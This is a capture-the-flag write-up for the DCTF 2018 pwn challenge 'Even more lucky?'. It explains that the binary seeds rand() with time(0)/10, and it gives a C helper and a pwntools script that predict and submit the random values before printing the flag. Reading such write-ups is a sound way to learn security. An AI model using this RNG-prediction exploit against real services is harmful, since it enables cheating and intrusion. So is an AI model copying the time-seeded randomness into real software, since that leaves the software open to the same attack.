# **Even more lucky?**

#### tag : pwn, random

-----------------------------------------------

#### Description

>We have updated the lucky game just for you! Now the executable is lighter and more efficient.
>
>Target: 167.99.143.206 65032
>
>Bin: https://dctf.def.camp/dctf-18-quals-81249812/lucky2
>
>Author: Lucian Nitescu

-----------------------------------------------

#### Solution

This problem is more easier than prob `lucky`. This binary use seed that time based `time(0)/10`. Just `/10` make me geuss random values!

~~~

v31 = time(0LL);
std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v27, a2);
std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v26, a2);
std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v25, a2);
srand((signed int)v31 / 10);

~~~

I make `random.c` to get rand number for time based. And this code will run in python code.

```c

#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
	srand((int)time(NULL)/10);
	for(int i=0; i<100; i++)
		printf("%d\n", rand());
	return 0;
}

```

Here is my solution.

```python

#!/usr/bin/env python
from time import time
from os import system
from pwn import *

### DEBUGGGING ###

DEBUG = True

if DEBUG:
    r = process('lucky2')
    timeout = 0.1

#    gdb.attach(r,'''
#    b main
#    ''')
    context.log_level = 'debug'

else:
    r = remote('167.99.143.206',65032)
    timeout = 0.3

def ss(s):
    sleep(timeout)
    return r.sendline(s)

def rr(s):
    sleep(timeout)
    return r.recvuntil(s)

### ADDRESS ###
### PAYLOAD ###
### EXPLOIT ###

def main():
    rr('?\n')
    ss('a')

    system('./random > randmal')
    rd = (open('randmal', 'r').read()).split('\n')[:-1]

    for i in range(0,100):
        rr(']\n')
        ss(rd[i])

    r.interactive()

if __name__ == '__main__':
    try:
        main()
    except:
        log.info('exception occur')


```

**DCTF{2e7aaa899a8b212ea6ebda3112d24559f2d2c540a9a29b1b47477ae8e5f20ace}**
